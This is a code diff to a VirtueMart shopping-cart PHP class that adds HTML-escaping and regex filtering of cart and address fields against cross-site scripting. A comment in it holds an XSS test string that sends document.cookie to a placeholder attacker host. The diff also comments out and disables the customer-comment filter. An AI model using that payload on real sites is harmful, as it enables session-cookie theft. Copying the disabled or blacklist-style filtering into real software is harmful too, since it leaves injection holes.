@@ -703,7 +703,7 @@ class VirtueMartCart {
 		}
 	}
 
-	public function getFilterCustomerComment(){
+/*	public function getFilterCustomerComment(){
 
 		$this->customer_comment = vmRequest::getVar('customer_comment', $this->customer_comment);
 		// no HTML TAGS but permit all alphabet
@@ -711,7 +711,7 @@ class VirtueMartCart {
 		$value = (string)preg_replace('#on[a-z](.+?)\)#si','',$value);//replace start of script onclick() onload()...
 		$value = trim(str_replace('"', ' ', $value),"'") ;
 		$this->customer_comment = (string)preg_replace('#^\'#si','',$value);//replace ' at start
-	}
+	}/*/
 
 	private function checkoutData($redirect = true) {
 
@@ -719,7 +719,7 @@ class VirtueMartCart {
 		$this->_inCheckOut = true;
 
 		$this->STsameAsBT = VmRequest::getInt('STsameAsBT', $this->STsameAsBT);
-		$this->getFilterCustomerComment();
+		//$this->getFilterCustomerComment();
 		$this->order_language = VmRequest::getVar('order_language', $this->order_language);
 
 		//Either we use here $this->_redirect, or we redirect always directly, atm we check the boolean _redirect
@@ -1027,32 +1027,38 @@ class VirtueMartCart {
 
 		$cartFields = $userFieldsModel->getUserFields(
 			'cart'
-			, array('required' => true, 'delimiters' => true, 'captcha' => true, 'system' => false)
+			, array('delimiters' => true, 'captcha' => true, 'system' => false)
 			, array('delimiter_userinfo', 'name','username', 'password', 'password2', 'address_type_name', 'address_type', 'user_is_vendor', 'agreed'));
 
+		if(!class_exists('vmFilter'))require(JPATH_VM_ADMINISTRATOR.DS.'helpers'.DS.'vmfilter.php');
 		foreach ($cartFields as $fld) {
 			if(!empty($fld->name)){
 				$name = $fld->name;
 				if(!isset($data[$name])){
 
-					if($fld->type=='text'){
-						$tmp = vmRequest::getString($name,false);
-						if($tmp){
-							$data[$name] = $tmp;
-						}
-					} else if($fld->type=='checkbox'){
+					if($fld->type=='checkbox'){
 						$tmp = vmRequest::getInt($name,false);
 						if($tmp){
 							$data[$name] = $tmp;
 							vmdebug('SET TOS by REQUEST ',$tmp);
 						}
 					} else {
-						vmdebug('my fld ',$fld);
+						$tmp = vmRequest::getString($name,false);
+						if($tmp){
+							$data[$name] = $tmp;
+						}
 					}
 
 				}
 
+				//Lets filter it, test string
+	//öäü?ß<script>alert("attacked")</script> <a href=# onclick=\"document.location=\'http://not-real-xssattackexamples.com/xss.php?c=\'+escape\(document.cookie\)\;\">My Name</a>
 				if(isset($data[$name])){
+					if(!empty($data[$name])){
+						$data[$name] = htmlspecialchars ($data[$name],ENT_QUOTES|ENT_SUBSTITUTE,'UTF-8',false);
+						$data[$name] = (string)preg_replace('#on[a-z](.+?)\)#si','',$data[$name]);//replace start of script onclick() onload()...
+					}
+
 					$this->cartfields[$name] = $data[$name];
 					vmdebug('Store $this->cartfields[$name] '.$name.' '.$data[$name]);
 				}
@@ -1089,6 +1095,7 @@ class VirtueMartCart {
 		}
 
 		$address = array();
+		if(!class_exists('vmFilter'))require(JPATH_VM_ADMINISTRATOR.DS.'helpers'.DS.'vmfilter.php');
 		foreach ($prepareUserFields as $fld) {
 			if(!empty($fld->name)){
 				$name = $fld->name;
@@ -1105,6 +1112,17 @@ class VirtueMartCart {
 				}
 
 				if(isset($data[$prefix.$name])){
+					if(!empty($data[$prefix.$name])){
+
+						$value = vmFilter::hl( $data[$prefix.$name],array('deny_attribute'=>'*'));
+						//to strong
+						/* $value = preg_replace('@<[\/\!]*?[^<>]*?>@si','',$value);//remove all html tags  */
+						//lets use instead
+						$value = JComponentHelper::filterText($value);
+						$value = (string)preg_replace('#on[a-z](.+?)\)#si','',$value);//replace start of script onclick() onload()...
+						$value = trim(str_replace('"', ' ', $value),"'") ;
+						$data[$prefix.$name] = (string)preg_replace('#^\'#si','',$value);
+					}
 					$address[$name] = $data[$prefix.$name];
 				} else {
 					vmdebug('Data not found for '.$name.' ');
